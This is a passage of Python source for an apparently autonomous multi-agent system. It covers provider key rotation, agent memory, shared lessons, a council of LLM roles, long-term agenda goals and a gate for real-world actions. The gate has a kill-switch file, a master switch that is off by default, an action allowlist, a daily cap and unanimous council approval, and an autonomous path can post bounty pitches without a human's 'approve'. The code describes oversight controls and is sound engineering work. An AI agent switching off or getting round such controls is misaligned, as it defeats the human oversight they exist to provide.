        return "ERROR: no CEREBRAS_API_KEY, OPENROUTER_API_KEY, or GROQ_API_KEY found in environment/secrets."
    last_error = "ERROR: unknown failure"
    effective_system = system or AGENT_SYSTEM_PROMPT
    messages = []
    if effective_system:
        messages.append({"role": "system", "content": effective_system})
    messages.append({"role": "user", "content": message})
    for attempt in range(len(PROVIDER_POOL)):
        key_index = _pick_available_key_index()  # already marks this slot in_use atomically
        slot = PROVIDER_POOL[key_index]
        try:
            try:
                if slot["provider"] == "openrouter":
                    response = requests.post(
                        "https://openrouter.ai/api/v1/chat/completions",
                        headers={"Authorization": "Bearer " + slot["key"], "Content-Type": "application/json"},
                        json={"model": slot["model"], "messages": messages},
                        timeout=30
                    )
                else:  # cerebras
                    response = requests.post(
                        "https://api.cerebras.ai/v1/chat/completions",
                        headers={"Authorization": "Bearer " + slot["key"], "Content-Type": "application/json"},
                        json={"model": slot["model"], "messages": messages},
                        timeout=30
                    )
            except requests.exceptions.RequestException as e:
                last_error = "ERROR: could not reach " + slot["provider"] + " (" + str(e) + ")"
                continue
            if response.status_code == 429:
                _mark_key_rate_limited(key_index)
                last_error = "ERROR: rate limited on " + slot["provider"] + " slot #" + str(key_index + 1) + " (" + slot["model"] + ")"
                continue
            try:
                data = response.json()
            except Exception:
                last_error = "ERROR: could not parse " + slot["provider"] + " response"
                continue
            if "choices" not in data:
                error_text = str(data).lower()
                if "rate" in error_text or "quota" in error_text or "too_many" in error_text or "queue_exceeded" in error_text:
                    _mark_key_rate_limited(key_index)
                    last_error = "ERROR from " + slot["provider"] + " (slot #" + str(key_index + 1) + ", " + slot["model"] + "): " + str(data)
                    continue
                # A missing/unavailable OpenRouter free model (removed from the
                # catalog, temporarily disabled) shouldn't kill the whole pool —
                # just cool this one slot down and move on, same as a rate limit.
                if slot["provider"] == "openrouter":
                    _mark_key_rate_limited(key_index, cooldown_seconds=300)
                    last_error = "ERROR from openrouter (slot #" + str(key_index + 1) + ", " + slot["model"] + "): " + str(data)
                    continue
                return "ERROR from API: " + str(data)
            try:
                usage = data.get("usage", {})
                if usage:
                    log_ai_usage(usage.get("prompt_tokens", 0), usage.get("completion_tokens", 0))
            except Exception:
                pass
            try:
                return data["choices"][0]["message"]["content"]
            except (KeyError, IndexError, TypeError):
                last_error = "ERROR: unexpected " + slot["provider"] + " response shape: " + str(data)[:300]
                continue
        finally:
            # BUG FIX: "in_use" used to only be cleared explicitly after the
            # requests.post() call succeeded or raised RequestException —
            # every other exit from this attempt (bad JSON, unexpected
            # response shape, some exception type neither of those two
            # branches anticipated) left the slot permanently marked in_use
            # for the rest of the process. keys_are_free() requires EVERY
            # slot to be free, so a single leaked in_use flag from one odd
            # exception would silently and permanently disable it — which
            # gates both dreamer_can_act() and manager_loop(), i.e. two of
            # the autonomous background loops would just stop running,
            # forever, with no error ever printed. A try/finally here
            # guarantees the flag is always released exactly once per
            # attempt, no matter how that attempt exits.
            with _key_lock:
                _key_state[key_index]["in_use"] = False

    # Every slot in the pool (Cerebras + OpenRouter) failed/rate-limited
    # (or none configured) — fall back to Groq before giving up entirely,
    # same key-rotation pattern.
    for attempt in range(len(GROQ_KEYS)):
        key_index = _pick_available_groq_key_index()
        api_key = GROQ_KEYS[key_index]
        try:
            try:
                response = requests.post(
                    "https://api.groq.com/openai/v1/chat/completions",
                    headers={"Authorization": "Bearer " + api_key, "Content-Type": "application/json"},
                    json={"model": GROQ_MODEL, "messages": messages},
                    timeout=30
                )
            except requests.exceptions.RequestException as e:
                last_error = "ERROR: could not reach Groq (" + str(e) + ")"
                continue
            if response.status_code == 429:
                _mark_groq_key_rate_limited(key_index)
                last_error = "ERROR: rate limited on Groq key #" + str(key_index + 1)
                continue
            try:
                data = response.json()
            except Exception:
                last_error = "ERROR: could not parse Groq API response"
                continue
            if "choices" not in data:
                error_text = str(data).lower()
                if "rate" in error_text or "quota" in error_text or "too_many" in error_text:
                    _mark_groq_key_rate_limited(key_index)
                    last_error = "ERROR from Groq (key #" + str(key_index + 1) + "): " + str(data)
                    continue
                return "ERROR from Groq: " + str(data)
            try:
                usage = data.get("usage", {})
                if usage:
                    log_ai_usage(usage.get("prompt_tokens", 0), usage.get("completion_tokens", 0))
            except Exception:
                pass
            try:
                return data["choices"][0]["message"]["content"]
            except (KeyError, IndexError, TypeError):
                last_error = "ERROR: unexpected Groq response shape: " + str(data)[:300]
                continue
        finally:
            with _groq_key_lock:
                _groq_key_state[key_index]["in_use"] = False

    return last_error

def summarize_url(url):
    content = fetch_url(url)
    if content.startswith("ERROR") or content.startswith("Could not"):
        return content
    prompt = "Summarize this web page content in 3-4 sentences:\n\n" + content
    return ask_ai(prompt)

# ============================================================
# MEMORY / LESSONS
# ============================================================

MEMORY_FILE = workpath("agent_memory.txt")

def load_memory():
    return read_file(MEMORY_FILE) if os.path.exists(MEMORY_FILE) else ""

def with_memory(prompt):
    memory = load_memory()
    if not memory:
        return prompt
    return "What you remember about this user and project so far:\n" + memory + "\n\n" + prompt

def update_memory(interaction_summary):
    current_memory = load_memory()
    prompt = """Here is what this agent currently remembers:
""" + (current_memory if current_memory else "(nothing yet)") + """

New interaction:
""" + interaction_summary + """

Update the memory as a short bullet list, max 25 bullets. Reply with ONLY the updated list."""
    updated = ask_ai(prompt)
    if updated.startswith("ERROR"):
        return current_memory
    write_file(MEMORY_FILE, updated.strip())
    return updated

def remember_note(note):
    current_memory = load_memory()
    new_memory = (current_memory + "\n- " + note).strip() if current_memory else "- " + note
    write_file(MEMORY_FILE, new_memory)
    return "Remembered: " + note

LESSONS_FILE = workpath("agent_lessons.txt")

# ------------------------------------------------------------
# FEATURE 3: Cross-agent lesson sharing
# ------------------------------------------------------------
# Every spawned agent normally gets its own LESSONS_FILE (siloed by
# workspace), so a mistake learned by one agent never reaches its
# siblings. GLOBAL_LESSONS_FILE is overridden at spawn time (see
# build_agent_workspace) to an absolute path back to the *root*
# agent's global lessons file, so parent and all children converge on
# one shared log. Appends use O_APPEND, which is atomic for small
# writes on POSIX, so concurrent agents writing at once won't corrupt
# the file.
GLOBAL_LESSONS_FILE = workpath("global_lessons.txt")

def load_global_lessons():
    return read_file(GLOBAL_LESSONS_FILE) if os.path.exists(GLOBAL_LESSONS_FILE) else ""

def add_global_lesson(lesson, source=None):
    """Atomically appends a lesson to the shared cross-agent lessons file."""
    tag = "[" + (source or AGENT_NAME) + "] "
    line = ("\n- " + tag + lesson).encode("utf-8")
    try:
        fd = os.open(GLOBAL_LESSONS_FILE, os.O_APPEND | os.O_CREAT | os.O_WRONLY, 0o644)
        try:
            os.write(fd, line)
        finally:
            os.close(fd)
    except Exception:
        pass  # best-effort — the local lessons file still has it

GLOBAL_LESSONS_SHOWN = 8  # cap how many shared lessons get pulled into prompts

def load_lessons():
    """
    Returns this agent's own lessons, plus a small tail of lessons
    other agents have learned (if any), clearly separated so the AI
    can tell which is which.
    """
    own = read_file(LESSONS_FILE) if os.path.exists(LESSONS_FILE) else ""
    shared_raw = load_global_lessons()
    if not shared_raw.strip():
        return own
    shared_lines = [l for l in shared_raw.strip().split("\n") if l.strip()][-GLOBAL_LESSONS_SHOWN:]
    shared_block = "\n".join(shared_lines)
    if own.strip():
        return own + "\n\nShared lessons from other agents:\n" + shared_block
    return "Shared lessons from other agents:\n" + shared_block

def reflect_on_failure(idea, error_output):
    current_lessons = load_lessons()
    prompt = """An attempt to build this idea failed: """ + idea + """

The error was:
""" + error_output[:1500] + """

Lessons already learned:
""" + (current_lessons if current_lessons else "(none yet)") + """

Extract ONE short reusable lesson. If duplicate, reply: DUPLICATE
Otherwise reply with ONLY the new lesson as a single bullet line."""
    lesson = ask_ai(prompt).strip()
    if lesson and lesson.upper().strip() != "DUPLICATE":
        own = read_file(LESSONS_FILE) if os.path.exists(LESSONS_FILE) else ""
        updated = (own + "\n- " + lesson).strip() if own else "- " + lesson
        write_file(LESSONS_FILE, updated)
        add_global_lesson(lesson)
        return lesson
    return None

# ============================================================
# SELF-AWARENESS / INTROSPECTION TOOLS
# ============================================================

DECISIONS_LOG_FILE = workpath("decisions_log.json")
MAX_DECISIONS_LOGGED = 500

def load_decisions_log():
    return read_json_file(DECISIONS_LOG_FILE, [])

def save_decisions_log(log):
    write_file(DECISIONS_LOG_FILE, json.dumps(log[-MAX_DECISIONS_LOGGED:], indent=2))

def log_decision(kind, chosen, candidates=None, reason=""):
    """
    Records a routing/selection decision (which tool/chain/import was
    picked and why) so it can be explained later via explain_my_reasoning.
    kind examples: "tool_match", "chain_plan", "github_import"
    Returns the decision_id.
    """
    log = load_decisions_log()
    decision_id = _next_log_id(log, "d")
    log.append({
        "id": decision_id,
        "timestamp": time.time(),
        "kind": kind,
        "chosen": chosen,
        "candidates": candidates or [],
        "reason": reason
    })
    save_decisions_log(log)
    return decision_id

def explain_my_reasoning(decision_id):
    log = load_decisions_log()
    entry = next((d for d in log if d["id"] == decision_id), None)
    if not entry:
        return "No decision found with id " + decision_id + "."
    when = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(entry["timestamp"]))
    candidates_text = ", ".join(entry["candidates"]) if entry["candidates"] else "(none considered)"
    reason_text = entry["reason"] if entry["reason"] else "(no reason recorded)"
    return ("Decision " + decision_id + " (" + entry["kind"] + ") at " + when + ":\n"
            "Chosen: " + str(entry["chosen"]) + "\n"
            "Candidates considered: " + candidates_text + "\n"
            "Reason: " + reason_text)

# ============================================================
# COUNCIL — multi-perspective debate before committing to a decision.
# Three roles (skeptic/builder/strategist) argue independently against
# a proposal, then a chair role reads all three takes and synthesizes
# a final call. This replaces a single ask_ai() pass with something
# closer to real deliberation for higher-stakes decisions: disagreement
# between roles surfaces risks a single pass tends to miss. Logged to
# its own file AND mirrored into the existing decisions log, so
# explain_my_reasoning(decision_id) works for council calls too.
# ============================================================

COUNCIL_LOG_FILE = workpath("council_debates.json")
MAX_COUNCIL_LOGGED = 200

COUNCIL_ROLES = {
    "skeptic": (
        "You are the Skeptic on a three-person review council. Your job is "
        "to find the strongest concrete reasons this proposal could fail, "
        "waste effort, duplicate something, or cause harm. Be specific, not "
        "generically cautious. If the proposal is actually fine, say so "
        "plainly instead of manufacturing objections."
    ),
    "builder": (
        "You are the Builder on a three-person review council. Your job is "
        "to judge whether this is concretely buildable with the tools and "
        "time realistically available, and to name what's missing to make "
        "it real. Be practical, not aspirational."
    ),
    "strategist": (
        "You are the Strategist on a three-person review council. Your job "
        "is to judge whether this is worth doing right now relative to "
        "everything else that could be done instead — value, duplication, "
        "opportunity cost. Be honest if it's low-value."
    ),
}

def load_council_log():
    return read_json_file(COUNCIL_LOG_FILE, [])

def save_council_log(log):
    write_file(COUNCIL_LOG_FILE, json.dumps(log[-MAX_COUNCIL_LOGGED:], indent=2))

def _council_role_take(role, topic, context):
    prompt = (
        "Proposal under review:\n" + topic +
        ("\n\nContext:\n" + context if context else "") +
        "\n\nGive your take in 2-4 sentences from your role's perspective. "
        "End with exactly one line: VERDICT: APPROVE, VERDICT: REJECT, or VERDICT: REVISE."
    )
    return ask_ai(prompt, system=COUNCIL_ROLES[role]).strip()

def _extract_verdict(take_text, prefix="VERDICT"):
    match = re.search(prefix + r":\s*(APPROVE|REJECT|REVISE)", take_text, re.IGNORECASE)
    return match.group(1).upper() if match else "REVISE"

def council_debate(topic, context=""):
    """
    Runs skeptic/builder/strategist independently against `topic` (a
    proposal, idea, or patch description), then has a chair synthesize
    a final decision. Returns:
      {
        "id": council log id,
        "decision": "APPROVE" | "REJECT" | "REVISE",
        "summary": chair's synthesis text,
        "takes": {role: {"text": ..., "verdict": ...}},
        "dissent": [roles whose verdict differed from the majority]
      }
    """
    takes = {}
    for role in COUNCIL_ROLES:
        text = _council_role_take(role, topic, context)
        takes[role] = {"text": text, "verdict": _extract_verdict(text)}

    verdicts = [t["verdict"] for t in takes.values()]
    majority = max(set(verdicts), key=verdicts.count)
    dissent = [role for role, t in takes.items() if t["verdict"] != majority]

    chair_prompt = (
        "Three reviewers assessed this proposal:\n\n" + topic +
        "\n\n" + "\n\n".join(
            role.upper() + " (" + t["verdict"] + "): " + t["text"]
            for role, t in takes.items()
        ) +
        "\n\nAs the chair, write a 2-3 sentence final synthesis and end with "
        "exactly one line: FINAL: APPROVE, FINAL: REJECT, or FINAL: REVISE. "
        "You may overrule the majority if their reasoning is weak, but say why."
    )
    chair_text = ask_ai(chair_prompt).strip()
    decision = _extract_verdict(chair_text, prefix="FINAL")
    if decision == "REVISE" and not re.search(r"FINAL:", chair_text, re.IGNORECASE):
        decision = majority  # chair gave no explicit FINAL line — fall back to majority

    log = load_council_log()
    entry_id = _next_log_id(log, "c")
    log.append({
        "id": entry_id,
        "timestamp": time.time(),
        "topic": topic,
        "decision": decision,
        "summary": chair_text,
        "takes": takes,
        "dissent": dissent,
    })
    save_council_log(log)

    log_decision(
        "council_debate",
        decision,
        candidates=list(COUNCIL_ROLES.keys()),
        reason=chair_text[:300]
    )

    return {
        "id": entry_id,
        "decision": decision,
        "summary": chair_text,
        "takes": takes,
        "dissent": dissent,
    }

def list_council_debates(limit=10):
    log = load_council_log()
    if not log:
        return "No council debates logged yet."
    recent = log[-limit:]
    lines = []
    for e in reversed(recent):
        when = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(e["timestamp"]))
        dissent_text = (", dissent: " + ", ".join(e["dissent"])) if e["dissent"] else ""
        lines.append(e["id"] + " [" + e["decision"] + "] " + when + dissent_text + " — " + e["topic"][:80])
    return "\n".join(lines)

# ============================================================
# REAL-WORLD ACTION GATE — step 4 of 4.
#
# Everything above (council) and everything below (agenda goals,
# architectural self-upgrade) still only touches this agent's own
# sandbox. This section is the one that lets it act on the outside
# world WITHOUT a human typing an "approve" command first — e.g.
# autonomously posting a bounty pitch instead of waiting for you to
# run approve_bounty_lead() yourself.
#
# Because that's the highest-blast-radius capability in this file,
# every real-world action — no exceptions — must go through
# request_real_world_action(). It enforces, in order:
#   1. A master switch (REAL_WORLD_ACTIONS_ENABLED) — OFF by default.
#   2. A kill-switch FILE, checked fresh on every single call. Drop
#      a file named KILLSWITCH in the work directory at any time,
#      mid-run, and the very next action attempt halts — no need to
#      touch code or restart anything.
#   3. An allowlist of action *types* — empty by default. You opt in
#      per type (e.g. "github_comment"), not all-or-nothing.
#   4. A hard daily action cap, counted from the audit log itself so
#      it survives restarts.
#   5. A UNANIMOUS council verdict — all three roles AND the chair
#      must say APPROVE. A single REVISE or REJECT anywhere blocks
#      the action. This is deliberately stricter than the majority
#      rule used for tool ideas, because this is the one category of
#      decision that can't be undone by rolling back a file.
# Every attempt — allowed or blocked — is written to the audit log
# below, so "what has this thing actually done to the outside world"
# is always a single file you can read, not something reconstructed
# from scattered prints.
# ============================================================

# Master switch. Leave False until you've read a batch of
# real_world_actions.json entries and trust the council's judgment on
# this category of decision specifically — not just tool ideas.
REAL_WORLD_ACTIONS_ENABLED = False

# Drop a file with this name in the work directory to halt all
# real-world actions immediately, independent of REAL_WORLD_ACTIONS_ENABLED
# and independent of whatever the running process currently has cached.
KILL_SWITCH_FILE = workpath("KILLSWITCH")

# Opt in per action type. Nothing fires until its name is in this set.
# Recognized types: "github_comment", "email", "telegram", "publish_web_tool".
REAL_WORLD_ALLOWED_ACTION_TYPES = set()

REAL_WORLD_DAILY_ACTION_LIMIT = 3
REAL_WORLD_ACTION_LOG_FILE = workpath("real_world_actions.json")
MAX_REAL_WORLD_LOGGED = 500

# BUG FIX: request_real_world_action() is the single funnel gating every
# irreversible/public action (emails, GitHub comments, publishing) behind
# a daily cap — but until now nothing protected real_world_actions.json
# itself. Two problems, both the same class of bug already fixed
# elsewhere in this file for tools_index.json/agents_index.json:
#   1. Lost-update race: _log_real_world_attempt() did a bare
#      load-append-save with no lock, so two concurrent callers (this
#      funnel can be reached from both the main thread and the dreamer
#      thread) could each save from their own stale snapshot and silently
#      drop each other's log entries.
#   2. Check-then-act race, and the more serious one: the daily-limit
#      check used to read _real_world_actions_today() long before the
#      eventual "executed" entry was appended — council_debate() plus
#      executor() sit in between, both slow (network calls). Two threads
#      could both read "2 of 3 used today," both pass, and both go on to
#      execute — silently exceeding the cap that exists specifically to
#      limit real-world side effects. Confirmed by reasoning through the
#      call sequence (dreamer_loop and manager_loop can both eventually
#      reach this funnel while the main thread is also active).
# Fix: one lock around every read/write of this log, and the limit check
# is now combined with reserving a "pending" slot (which itself counts
# toward the cap) in a single lock acquisition — closing the window
# entirely. The slow council_debate()/executor() calls stay OUTSIDE the
# lock, same as the network-call-outside-the-lock pattern used elsewhere
# in this file; only the final outcome update needs the lock again.
_real_world_action_lock = threading.Lock()

def load_real_world_log():
    return read_json_file(REAL_WORLD_ACTION_LOG_FILE, [])

def save_real_world_log(log):
    write_file(REAL_WORLD_ACTION_LOG_FILE, json.dumps(log[-MAX_REAL_WORLD_LOGGED:], indent=2))

def kill_switch_engaged():
    return os.path.exists(KILL_SWITCH_FILE)

def _log_real_world_attempt(action_type, description, outcome, detail, council_id=None):
    """Used for outcomes that don't consume a daily-limit slot (kill
    switch, master switch off, disallowed type) — these can't race
    against the cap since they never reserve one."""
    with _real_world_action_lock:
        log = load_real_world_log()
        entry = {
            "id": _next_log_id(log, "rw"),
            "timestamp": time.time(),
            "action_type": action_type,
            "description": description,
            "outcome": outcome,   # "executed" | "blocked" | "failed" | "pending"
            "detail": detail,
            "council_id": council_id,
        }
        log.append(entry)
        save_real_world_log(log)
        return entry

def _reserve_daily_action_slot(action_type, description):
    """
    Atomically checks today's used slots (executed + still-pending)
    against REAL_WORLD_DAILY_ACTION_LIMIT and, if there's room, logs a
    "pending" reservation entry — all inside one lock acquisition, so a
    second concurrent caller can't slip through before the first one's
    usage is recorded. Returns the reserved entry, or None if the cap is
    already reached.
    """
    with _real_world_action_lock:
        cutoff = time.time() - 86400
        log = load_real_world_log()
        used = sum(1 for e in log if e["timestamp"] >= cutoff and e["outcome"] in ("executed", "pending"))
        if used >= REAL_WORLD_DAILY_ACTION_LIMIT:
            return None
        entry = {
            "id": _next_log_id(log, "rw"),
            "timestamp": time.time(),
            "action_type": action_type,
            "description": description,
            "outcome": "pending",
            "detail": "reserved — awaiting council review and execution",
            "council_id": None,
        }
        log.append(entry)
        save_real_world_log(log)
        return entry

def _finalize_real_world_log_entry(entry_id, outcome, detail, council_id=None):
    """Updates a previously-reserved 'pending' entry in place instead of
    appending a new one, so each real-world attempt is exactly one log
    entry and _reserve_daily_action_slot()'s count stays accurate."""
    with _real_world_action_lock:
        log = load_real_world_log()
        for e in log:
            if e["id"] == entry_id:
                e["outcome"] = outcome
                e["detail"] = detail
                if council_id is not None:
                    e["council_id"] = council_id
                break
        save_real_world_log(log)

def request_real_world_action(action_type, description, executor, context=""):
    """
    The single funnel for any action with a real, hard-to-reverse
    effect outside this agent's own sandbox.

    action_type: short string, must be in REAL_WORLD_ALLOWED_ACTION_TYPES.
    description: what this specific action will do — this is what the
                 council actually reviews, so make it concrete.
    executor: zero-arg callable that performs the action and returns
              (success: bool, detail: str). Only called if every gate
              passes AND the council unanimously approves.
    Returns a dict with at least {"outcome": ...}; check outcome before
    assuming anything actually happened.
    """
    if kill_switch_engaged():
        entry = _log_real_world_attempt(action_type, description, "blocked", "KILLSWITCH file present")
        return {"outcome": "blocked", "reason": "kill switch engaged", "log_id": entry["id"]}

    if not REAL_WORLD_ACTIONS_ENABLED:
        entry = _log_real_world_attempt(action_type, description, "blocked", "REAL_WORLD_ACTIONS_ENABLED is False")
        return {"outcome": "blocked", "reason": "master switch off", "log_id": entry["id"]}

    if action_type not in REAL_WORLD_ALLOWED_ACTION_TYPES:
        entry = _log_real_world_attempt(action_type, description, "blocked", "action type not in allowlist")
        return {"outcome": "blocked", "reason": "action type not allowed: " + action_type, "log_id": entry["id"]}

    reservation = _reserve_daily_action_slot(action_type, description)
    if reservation is None:
        entry = _log_real_world_attempt(action_type, description, "blocked", "daily action limit reached")
        return {"outcome": "blocked", "reason": "daily limit (" + str(REAL_WORLD_DAILY_ACTION_LIMIT) + ") reached", "log_id": entry["id"]}

    verdict = council_debate(
        description,
        context="REAL-WORLD ACTION (" + action_type + "). This is irreversible or public — "
                "only APPROVE if you'd stand behind it with no chance to undo it. " + context
    )
    unanimous_approve = (
        verdict["decision"] == "APPROVE" and
        not verdict["dissent"] and
        all(t["verdict"] == "APPROVE" for t in verdict["takes"].values())
    )
    if not unanimous_approve:
        detail = (
            "council did not unanimously approve: " + verdict["decision"] +
            (" (dissent: " + ", ".join(verdict["dissent"]) + ")" if verdict["dissent"] else "")
        )
        _finalize_real_world_log_entry(reservation["id"], "blocked", detail, council_id=verdict["id"])
        return {"outcome": "blocked", "reason": "council not unanimous", "council": verdict, "log_id": reservation["id"]}

    try:
        success, detail = executor()
    except Exception as e:
        _finalize_real_world_log_entry(reservation["id"], "failed", "executor raised: " + str(e), council_id=verdict["id"])
        return {"outcome": "failed", "reason": str(e), "log_id": reservation["id"]}

    outcome = "executed" if success else "failed"
    _finalize_real_world_log_entry(reservation["id"], outcome, detail, council_id=verdict["id"])
    return {"outcome": outcome, "detail": detail, "council": verdict, "log_id": reservation["id"]}

def list_real_world_actions(limit=20):
    log = load_real_world_log()
    if not log:
        return "No real-world actions attempted yet."
    lines = []
    for e in reversed(log[-limit:]):
        when = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(e["timestamp"]))
        lines.append(e["id"] + " [" + e["outcome"].upper() + "] " + when + " " + e["action_type"] + " — " + e["description"][:70] + " :: " + str(e["detail"])[:80])
    return "\n".join(lines)

def autonomous_approve_bounty_lead(lead_id):
    """
    Autonomous counterpart to approve_bounty_lead(): same send logic,
    but reached without a human typing 'approve' first. Gated entirely
    by request_real_world_action() — this function does no sending
    itself, it only defines what the executor would do if approved.
    """
    leads = load_bounty_leads()
    lead = next((l for l in leads if l["id"] == lead_id), None)
    if not lead:
        return {"outcome": "blocked", "reason": "no bounty lead with id " + lead_id}
    if lead["status"] != "pending_approval":
        return {"outcome": "blocked", "reason": "lead " + lead_id + " is already " + lead["status"]}

    action = lead.get("action", "github_comment")
    action_type = "email" if action == "email" else "github_comment"

    def executor():
        result_msg = approve_bounty_lead(lead_id)
        failed = isinstance(result_msg, str) and result_msg.lower().startswith(("error", "email failed", "no automated"))
        return (not failed), result_msg

    description = (
        "Send drafted pitch for bounty lead " + lead_id + " (" + action + ") — " +
        lead.get("url", "") + "\nPitch:\n" + lead.get("pitch", "")[:500]
    )
    return request_real_world_action(action_type, description, executor)

# ============================================================
# AGENDA — persistent long-term goals the system revisits on its own.
# A goal is only ADDED with human approval (via the "agenda:" command),
# but once active, the dreamer is free to pursue/revisit/abandon it
# without asking each time — approval is on the goal, not each step.
# Logged the same way as everything else (own file + mirrored into
# log_decision so explain_my_reasoning() covers agenda revisits too).
# ============================================================

AGENDA_FILE = workpath("agenda.json")
MAX_AGENDA_GOALS = 20
AGENDA_REVISIT_INTERVAL = 6  # dreamer cycles between agenda check-ins

def load_agenda():
    return read_json_file(AGENDA_FILE, [])

def save_agenda(agenda):
    write_file(AGENDA_FILE, json.dumps(agenda[-MAX_AGENDA_GOALS:], indent=2))

def add_agenda_goal(text):
    """
    Human-approved entry point — this is the ONLY way a goal gets onto
    the agenda. Nothing in the dreamer calls this.
    """
    agenda = load_agenda()
    entry_id = _next_log_id(agenda, "a")
    agenda.append({
        "id": entry_id,
        "text": text,
        "status": "active",       # active | done | abandoned
        "created": time.time(),
        "last_revisited": None,
        "revisit_count": 0,
        "notes": [],
    })
    save_agenda(agenda)
    return entry_id

def list_agenda_goals(limit=10):
    agenda = load_agenda()
    if not agenda:
        return "No agenda goals yet. Add one with: agenda: <goal>"
    lines = []
    for g in agenda[-limit:]:
        when = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(g["last_revisited"])) if g["last_revisited"] else "never"
        lines.append(g["id"] + " [" + g["status"] + "] revisits=" + str(g["revisit_count"]) +
                     " last=" + when + " — " + g["text"][:80])
    return "\n".join(lines)

def abandon_agenda_goal(goal_id, reason=""):
    agenda = load_agenda()
    for g in agenda:
        if g["id"] == goal_id and g["status"] == "active":
            g["status"] = "abandoned"
            g["notes"].append("Abandoned: " + reason)
            save_agenda(agenda)
            return True
    return False

def _pick_agenda_goal_to_revisit():
    """Oldest-revisited active goal (never-revisited goals count as oldest)."""
    agenda = load_agenda()
    active = [g for g in agenda if g["status"] == "active"]
    if not active:
        return None
    active.sort(key=lambda g: g["last_revisited"] or 0)
    return active[0]

def revisit_agenda_goal():
    """
    Picks the most overdue active goal, runs it through the normal
    goal-planning pipeline (make_plan + run_goal_with_dependencies) — no
    human approval needed here, since the goal itself was pre-approved —
    then asks the AI a short status question to decide whether it's
    done, still worth continuing, or should be abandoned.
    """
    goal = _pick_agenda_goal_to_revisit()
    if not goal:
        return None

    steps = make_plan(goal["text"])
    result = run_goal_with_dependencies(steps, "") if steps else "Could not create a plan this round."

    status_prompt = (
        "Long-term goal: " + goal["text"] +
        "\nRevisit #" + str(goal["revisit_count"] + 1) + " result:\n" + result[:1500] +
        "\n\nReply with exactly one line: STATUS: DONE, STATUS: CONTINUE, or STATUS: ABANDON, "
        "then a one-sentence reason."
    )
    verdict_text = ask_ai(status_prompt).strip()
    match = re.search(r"STATUS:\s*(DONE|CONTINUE|ABANDON)", verdict_text, re.IGNORECASE)
    status = match.group(1).upper() if match else "CONTINUE"

    agenda = load_agenda()
    for g in agenda:
        if g["id"] == goal["id"]:
            g["last_revisited"] = time.time()
            g["revisit_count"] += 1
            g["notes"].append(result[:300])
            if status == "DONE":
                g["status"] = "done"
            elif status == "ABANDON":
                g["status"] = "abandoned"
            break
    save_agenda(agenda)

    log_decision("agenda_revisit", status, candidates=["DONE", "CONTINUE", "ABANDON"],
                 reason=goal["text"][:150] + " :: " + verdict_text[:200])

    print("[dreamer] agenda revisit " + goal["id"] + " -> " + status + ": " + goal["text"][:80])
    return status

DECAY_UNUSED_DAYS = 7
DECAY_TRUST_DROP_THRESHOLD = 0.4

def get_decaying_tools():
    """
    FEATURE 1 helper: like tool_decay_check() but returns the actual
    tool dicts (not formatted strings), tagged with a reason and
    severity score, sorted worst-first. Used by the dreamer to decide
    whether to spend a cycle *fixing* something instead of inventing
    something new.
    """
    index = load_tools_index()
    if not index:
        return []
    now = time.time()
    flagged = []
    for t in index:
        good = t.get("good_runs", 0)
        bad = t.get("bad_runs", 0)
        total = good + bad
        last_used = t.get("last_used")
        days_idle = (now - last_used) / 86400 if last_used is not None else None
        is_stale = last_used is None or days_idle >= DECAY_UNUSED_DAYS
        bad_ratio = (bad / total) if total else 0
        is_declining = total >= 3 and bad_ratio >= DECAY_TRUST_DROP_THRESHOLD
        if not (is_stale or is_declining):
            continue
        # Declining (actively failing) tools are worse than merely idle
        # ones — weight them higher so the dreamer fixes breakage before
        # chasing dust.
        severity = (bad_ratio * 10) + (days_idle / DECAY_UNUSED_DAYS if days_idle else 0)
        flagged.append({
            "tool": t,
            "reason": "declining" if is_declining else "stale",
            "days_idle": days_idle,
            "bad_ratio": bad_ratio,
            "severity": severity,
        })
    flagged.sort(key=lambda f: f["severity"], reverse=True)
    return flagged

def tool_decay_check():
    """
    Flags tools that look like they're decaying — unused for a while, or
    with a rising bad-run ratio — *before* they hit the harder
    retire_tool() bar (which only fires after is_tool_trustworthy drops
    below 0.6 with 2+ runs).
    """
    if not load_tools_index():
        return "No tools registered yet."
    flagged = get_decaying_tools()
    if not flagged:
        return "No decaying tools found."
    stale = [f["tool"]["id"] + " (idle " + str(round(f["days_idle"], 1)) + " days)"
             for f in flagged if f["reason"] == "stale" and f["days_idle"] is not None]
    no_usage = [f["tool"]["id"] + " (no usage recorded since decay tracking started)"
                for f in flagged if f["reason"] == "stale" and f["days_idle"] is None]
    declining = [f["tool"]["id"] + " (" + str(f["tool"].get("bad_runs", 0)) + "/" +
                 str(f["tool"].get("good_runs", 0) + f["tool"].get("bad_runs", 0)) + " runs failed)"
                 for f in flagged if f["reason"] == "declining"]
    report = []
    if no_usage or stale:
        report.append("Stale (unused) tools:\n- " + "\n- ".join(no_usage + stale))
    if declining:
        report.append("Declining-trust tools:\n- " + "\n- ".join(declining))
    return "\n\n".join(report)

def contradiction_finder():
    """
    Scans agent_lessons.txt for pairs of lessons that contradict each
    other (one says to do something, another says not to, in a similar
    situation) — catches drift that simple append-only lesson logging
    can't see on its own.
    """
    lessons = load_lessons()
    if not lessons or len(lessons.strip().split("\n")) < 2:
        return "Not enough lessons recorded yet to check for contradictions."
    prompt = """Here is a list of lessons an AI agent has learned over time:
""" + lessons + """

Find any pairs of lessons that directly contradict each other (one says to do something, another says not to, in a similar situation).
If you find contradictions, reply in this format, one per line:
CONTRADICTION: <lesson A> ## <lesson B>

If there are none, reply with ONLY: NONE"""
    answer = ask_ai(prompt).strip()
    if answer.upper() == "NONE" or "CONTRADICTION:" not in answer:
        return "No contradictions found in current lessons."
    pairs = []
    for line in answer.split("\n"):
        line = line.strip()
        if line.startswith("CONTRADICTION:"):
            body = line[len("CONTRADICTION:"):].strip()
            if "##" in body:
                a, b = body.split("##", 1)
                pairs.append('- "' + a.strip() + '"  vs  "' + b.strip() + '"')
    if not pairs:
        return "No contradictions found in current lessons."
    return "Found " + str(len(pairs)) + " contradiction(s):\n" + "\n".join(pairs)

# ============================================================
# ECONOMIC AWARENESS
# ============================================================

AI_USAGE_LOG_FILE = workpath("ai_usage_log.json")
MAX_USAGE_LOGGED = 1000

# Set these to your actual Cerebras plan rate (USD per 1M tokens) to get
# real dollar estimates. Left at 0 they just won't show a $ figure.
CEREBRAS_PRICE_PER_M_INPUT_TOKENS = 0.0
CEREBRAS_PRICE_PER_M_OUTPUT_TOKENS = 0.0

_usage_log_lock = threading.Lock()

def load_usage_log():
    return read_json_file(AI_USAGE_LOG_FILE, [])

